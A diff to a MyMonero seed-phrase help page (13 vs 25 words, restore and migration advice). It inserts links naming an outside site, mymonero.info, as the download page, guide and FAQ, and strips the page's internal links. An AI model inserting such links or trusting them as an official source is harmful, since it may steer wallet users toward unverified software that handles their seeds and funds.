@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 MyMonero may use a 13-word legacy seed specific to MyMonero or a 25-word standard Monero seed. The number of words is a useful clue, but keep the original phrase private and verify the appropriate restore path before entering it.
 
+
+The MyMonero.info site covers this in its [MyMonero seed 13 vs 25 words guide](https://mymonero.info/mymonero-seed-13-vs-25-words). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [the MyMonero FAQ](https://mymonero.info/faq) if anything feels off.
+
 ## You'll see this if
 - Your backup has 13 words and you are unsure whether it is complete.
 - A restore screen expects 25 words but your MyMonero note has 13.
@@ -52,14 +55,14 @@ The final MyMonero desktop release is v1.3.3. The old app still opens wallets an
 ## If that did not work
 If a restore form expects a different number of words, do not add invented words, omit entries, or switch word order to make the form accept it. Recheck your private backup and the wallet’s supported restore formats. A mismatch can also happen if the note is incomplete or belongs to another wallet; do not guess.
 
-If you have a 13-word phrase, see [the 13-word restore guide](./mymonero-13-word-seed-restore.md). If you have a 25-word phrase, see [the 25-word migration guide](./mymonero-25-word-seed-migration.md). Stop if the expected wallet does not appear after scanning, and verify that you chose the correct seed and restore height. A restore height that is too recent can omit earlier activity; starting earlier is safer but slower.
+If you have a 13-word phrase, see the 13-word restore guide. If you have a 25-word phrase, see the 25-word migration guide. Stop if the expected wallet does not appear after scanning, and verify that you chose the correct seed and restore height. A restore height that is too recent can omit earlier activity; starting earlier is safer but slower.
 
 If the wallet application itself is unavailable, MyMonero’s hosted servers and web wallet login are no longer available. The desktop app’s final release is v1.3.3 and it is not maintained. Cake Wallet is the only other wallet option named here; check current instructions before restoring. Do not trust anyone offering to convert the seed in exchange for a copy of it.
 
 ## Prevention
 Keep a private, legible, offline backup and label its format without including any words. Ensure the words are in order, complete, and associated with the correct wallet. Store backups where they are protected against both theft and ordinary damage. Do not make convenience copies in email, messaging apps, shared folders, or screenshots.
 
-Keep a separate note of restore context, such as the wallet identity and any known restore height, without revealing the seed. Be cautious when migrating: a restore uses the seed, while sweeping sends all funds to a new wallet. Review [the migration checklist](./mymonero-migration-checklist.md), safe backup practices, and private keys explained before changing wallets.
+Keep a separate note of restore context, such as the wallet identity and any known restore height, without revealing the seed. Be cautious when migrating: a restore uses the seed, while sweeping sends all funds to a new wallet. Review the migration checklist, safe backup practices, and private keys explained before changing wallets.
 
 ## FAQ
 <details><summary>Does a 13-word seed mean it is invalid?</summary>
@@ -90,6 +93,7 @@ The wallet may still scan from its restore height. An earlier height is safer wh
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
